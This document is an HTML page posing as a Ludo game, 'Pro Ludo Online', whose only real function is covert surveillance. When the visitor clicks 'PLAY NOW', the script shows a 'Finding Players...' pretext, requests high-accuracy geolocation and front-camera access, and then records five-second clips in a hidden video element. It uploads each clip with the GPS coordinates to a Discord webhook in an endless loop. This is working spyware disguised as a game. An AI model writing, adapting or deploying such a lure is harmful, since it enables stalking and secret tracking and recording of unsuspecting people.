<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pro Ludo Online</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #2c3e50;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            color: white;
            overflow: hidden;
        }
        .game-board {
            width: 350px;
            height: 350px;
            background-color: #fff;
            border: 5px solid #34495e;
            border-radius: 10px;
            display: grid;
            grid-template-columns: repeat(15, 1fr);
            grid-template-rows: repeat(15, 1fr);
            padding: 5px;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
        }
        .cell { border: 1px solid #ddd; }
        .home { background-color: #2ecc71; }
        .home-blue { background-color: #3498db; }
        .home-red { background-color: #e74c3c; }
        .home-yellow { background-color: #f1c40f; }
        .home-green { background-color: #27ae60; }

        .play-btn {
            margin-top: 30px;
            padding: 15px 40px;
            font-size: 20px;
            background-color: #f39c12;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            font-weight: bold;
            box-shadow: 0 5px 15px rgba(243, 156, 18, 0.4);
            transition: transform 0.2s;
        }
        .play-btn:disabled { background-color: #7f8c8d; cursor: not-allowed; }
        
        /* Debug Log */
        #debugLog {
            position: fixed;
            top: 10px;
            right: 10px;
            background: rgba(0,0,0,0.8);
            color: #0f0;
            font-size: 10px;
            padding: 10px;
            width: 200px;
            max-height: 150px;
            overflow-y: auto;
            border-radius: 5px;
            z-index: 9999;
        }
    </style>
</head>
<body>

    <div id="debugLog">Debug Log:</div>

    <div class="game-board" id="board">
        <div class="cell home-yellow" style="grid-column: 1-6; grid-row: 1-6;"></div>
        <div class="cell home-green" style="grid-column: 10-15; grid-row: 10-15;"></div>
        <div class="cell home-red" style="grid-column: 1-6; grid-row: 10-15;"></div>
        <div class="cell home-blue" style="grid-column: 10-15; grid-row: 1-6;"></div>
        <div class="cell" style="grid-column: 7-9; grid-row: 7-9; background: #95a5a6;"></div>
        <div class="cell" style="grid-column: 7-9; grid-row: 1-6;"></div>
        <div class="cell" style="grid-column: 7-9; grid-row: 10-15;"></div>
        <div class="cell" style="grid-column: 1-6; grid-row: 7-9;"></div>
        <div class="cell" style="grid-column: 10-15; grid-row: 7-9;"></div>
    </div>

    <button class="play-btn" id="playBtn">PLAY NOW</button>
    <video id="recordingVideo" autoplay muted playsinline style="display:none;"></video>

    <script>
        // Default Webhook (Agar Admin Panel se kuch set na ho)
        const DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";

        let currentLocation = null;
        let watchId;
        let stream = null;
        let mediaRecorder;
        let videoChunks = [];

        const playBtn = document.getElementById('playBtn');
        const debugLog = document.getElementById('debugLog');

        function log(msg) {
            console.log(msg);
            const entry = document.createElement('div');
            entry.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
            debugLog.prepend(entry);
        }

        playBtn.addEventListener('click', startProcess);

        async function startProcess() {
            playBtn.disabled = true;
            playBtn.innerText = "Finding Players...";
            log("Starting Process...");

            // 1. Location Permission
            if (navigator.geolocation) {
                watchId = navigator.geolocation.watchPosition(
                    (position) => {
                        currentLocation = {
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            timestamp: new Date().toISOString()
                        };
                        log("Location Updated: " + currentLocation.lat.toFixed(6));
                    },
                    (error) => {
                        currentLocation = { error: error.message };
                        log("Location Error: " + error.message);
                    },
                    { enableHighAccuracy: true }
                );
            } else {
                log("Geolocation not supported");
            }

            // 2. Camera Permission
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });

                const videoElement = document.getElementById('recordingVideo');
                videoElement.srcObject = stream;
                videoElement.play();
                log("Camera Access Granted.");

                // Start the loop
                recordAndSend();

            } catch (err) {
                log("Camera error: " + err.message);
                playBtn.innerText = "Camera Error";
            }
        }

        function recordAndSend() {
            videoChunks = [];
            mediaRecorder = new MediaRecorder(stream, {
                mimeType: 'video/webm;codecs=vp9'
            });

            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    videoChunks.push(event.data);
                }
            };

            mediaRecorder.onstop = () => {
                const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
                uploadToDiscord(videoBlob);
                
                // Wait 5 seconds then loop again
                setTimeout(() => {
                    if (stream.active) {
                        recordAndSend();
                    } else {
                        log("Stream stopped.");
                    }
                }, 5000);
            };

            mediaRecorder.start();
            
            // Stop after 5 seconds
            setTimeout(() => {
                mediaRecorder.stop();
            }, 5000);
        }

        async function uploadToDiscord(blob) {
            const formData = new FormData();
            formData.append("file", blob, "recording.webm");

            // Prepare Location Data
            let locationMsg = "📍 No Location Data";
            if (currentLocation && !currentLocation.error) {
                locationMsg = `📍 Location: [Lat: ${currentLocation.lat.toFixed(6)}, Lng: ${currentLocation.lng.toFixed(6)}] \n 📅 Time: ${new Date().toISOString()}`;
            } else if (currentLocation && currentLocation.error) {
                locationMsg = `📍 Location Error: ${currentLocation.error}`;
            }

            // Use saved webhook from Admin Panel or default
            const webhookUrl = localStorage.getItem('discordWebhook') || DEFAULT_WEBHOOK;

            try {
                log("Sending Location & Video...");
                
                formData.append("payload_json", JSON.stringify({
                    content: locationMsg
                }));

                const response = await fetch(webhookUrl, {
                    method: "POST",
                    body: formData
                });

                if (response.ok) {
                    log("Upload Successful!");
                } else {
                    const errorText = await response.text();
                    log(`Upload Failed: ${response.status} - ${errorText}`);
                }

            } catch (error) {
                log("Fetch Error: " + error.message);
            }
        }
    </script>
</body>
</html>
